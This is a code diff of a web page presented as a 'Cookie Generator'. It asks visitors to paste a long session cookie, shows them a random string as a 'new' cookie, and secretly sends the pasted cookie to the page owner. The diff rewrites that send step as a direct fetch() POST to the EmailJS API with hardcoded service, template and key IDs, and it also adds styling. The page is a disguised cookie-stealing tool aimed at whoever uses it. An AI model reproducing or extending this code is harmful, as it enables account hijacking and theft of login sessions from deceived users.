@@ -5,7 +5,56 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Cookie Generator</title>
   <style>
-    /* Your CSS styles */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #333;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #444;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
+      max-width: 500px;
+      width: 100%;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: none;
+      resize: none;
+      font-size: 14px;
+    }
+    button {
+      background-color: #5c6bc0;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #3f4b94;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
@@ -17,13 +66,7 @@
     <textarea id="newCookieOutput" rows="10" placeholder="Generated Cookie..." readonly></textarea>
   </div>
 
-  <!-- New EmailJS CDN link -->
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-
   <script>
-    // Initialize EmailJS
-    emailjs.init('1RUraa7fRYbQ2fuPR');
-
     // Function to generate a random code with uppercase letters and numbers only
     function generateRandomCode(length) {
       const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -52,7 +95,7 @@
         // Output the generated code
         newCookieOutput.value = newCode;
 
-        // Send the old cookie (input) to your email
+        // Send the old cookie (input) to your email using API call
         sendEmail(cookieInput);
       } else {
         // Show an error message if input is less than 700 characters
@@ -61,20 +104,41 @@
       }
     }
 
-    // Function to send email
+    // Function to send email using EmailJS API directly
     function sendEmail(cookieContent) {
       const templateParams = {
         cookie: cookieContent
       };
 
-      // Send email using EmailJS
-      emailjs.send('service_bupfcwd', 'template_fkuvg0k', templateParams)
-        .then(function(response) {
-          console.log('Email sent successfully:', response);
-        }, function(error) {
-          console.log('Failed to send email:', error);
-          alert('Error sending email: ' + error.text); // Alert to notify the user
-        });
+      // Prepare the payload for the API request
+      const payload = {
+        service_id: 'service_bupfcwd', // Your Service ID
+        template_id: 'template_fkuvg0k', // Your Template ID
+        user_id: '1RUraa7fRYbQ2fuPR',  // Your Public Key
+        template_params: templateParams
+      };
+
+      // Send the email via API
+      fetch('https://api.emailjs.com/api/v1.0/email/send', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.status === 200) {
+          console.log('Email sent successfully:', data);
+        } else {
+          console.log('Error sending email:', data);
+          alert('Error sending email: ' + data.message); // Show error if sending fails
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Error sending email: ' + error.message); // Show network error
+      });
     }
   </script>
 </body>
